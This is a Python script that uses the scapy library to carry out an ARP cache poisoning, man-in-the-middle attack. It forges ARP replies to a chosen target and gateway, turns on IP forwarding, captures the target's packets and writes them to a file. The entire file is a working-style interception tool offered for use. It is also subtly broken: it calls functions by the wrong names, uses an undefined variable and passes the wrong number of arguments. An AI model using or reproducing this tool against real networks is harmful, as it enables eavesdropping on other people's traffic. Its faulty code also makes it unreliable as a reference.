#!/usr/bin/python3
from scapy.all import *
import sys
import os
import time
import threading
import signal

try:
    networks = input("[>>] Enter a network interface, (like wlan0): ")
    targetIP = input("[>>] Enter the target's IP address: ")
    gateway_IP = input("[>>] Enter the gateway IP address: ")
    pkt_count = int(input("Enter desired packet count: "))
except KeyboardInterrupt:
    print("\n[#] KeyboardInterrupt invoked.. Shutting down..")
    print("[#] Good Bye!")
    sys.exit(1)

print("\n[#] Enabling IP Forwarding..")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("Done.")

# Set the interface
conf.iface = networks
# Set the level of verbosity to almost mute, where 3 is verbose
conf.verb = 0
print("[#] Setting interface {}".format(networks))
gateway_mac_addr = get_mac(gateway_IP)

if gateway_mac_addr is None:
    print("[*!!*] Failed to get MAC address from gateway.")
    print("\n[#] Exiting.")
    sys.exit(0)
else:
    print("[#] {} is at MAC address {}".format(gwIP, gateway_mac_addr))
    target_mac_addr = get_mac(targetIP)

    if target_mac_addr is None:
        print("[*!!*] Failed to get target's MAC address. Exiting.")
        sys.exit(0)
    else:
        print("[#] Target IP address {} is at {} MAC address".format(\
        targetIP, target_mac_addr))

# Create threads to target, use gateway IP, MAC, target IP, MAC as arguments
arp_thread = threading.Thread(target=arp_target, args=(\
gateway_IP, gateway_mac_addr, targetIP, target_mac_addr))
# Start threading
arp_thread.start()

try:
    print("[#] Starting to sniff for {} packets".format(pkt_count))
    # Berkeley Packet Filtering aka LSF - Linux Socket Filtering
    # allows a user-space program to attach a filter onto any socket and
    # allow or disallow certain types of data to come through the socket
    bpf_filter = "IP host {}".format(targetIP)
    packets = sniff(count=pkt_count, filter=bpf_filter, iface=networks)

    # Write the captured packets
    wrpcap('arp_cached', packets)

    # Restore network
    restore_network(gateway_IP, gateway_mac_addr, targetIP, target_mac_addr)
except KeyboardInterrupt:
    restore_network(gateway_IP, gateway_mac_addr, targetIP, target_mac_addr)
    sys.exit(0)

# Funtion to restore the network
def restore_network(gateway_IP, gateway_mac_addr, targetIP, target_mac_addr):
    print("[#] Restoring target...")
    send(ARP(op=2, psrc=gateway_IP, pdst=targetIP,\
    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac_addr), count=5)
    send(ARP(op=2, psrc=targetIP, pdst=gateway_IP,\
    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac_addr), count=5)

    # Send exit signal to main thread
    os.kill(os.getpid(), signal.SIGINT)

# Function to get MAC address from the IP
# srp - send/receive/packet
def get_mac_addr(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(\
    pdst=ip_address), timeout=2, retry=10)

    # MAC address return from a response
    for s,r in responses:
        return r[Ether].src
        return None

# Main poisoner function  
def arp_target(gateway_IP, gateway_mac_addr, targetIP, target_mac_addr):

    arp_target = ARP()
    arp_target.op = 2
    arp_target.psrc = gateway_IP
    arp_target.pdst = targetIP
    arp_target.hwdst = target_mac_addr

    arp_gateway = ARP()
    arp_gateway.op = 2
    arp_gateway.psrc = targetIP
    arp_gateway.pdst = gateway_IP
    arp_gateway.hwdst = gateway_mac_addr

    print("[#] ARP Cache poison attack starting... ")
    print("[#] To stop, press [CTRL-C]")

    while True:
        try:
            send(arp_target)
            send(arp_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_network(gateway_IP, gateway_mac_addr)
    print("[#] Attack finished.")
    return
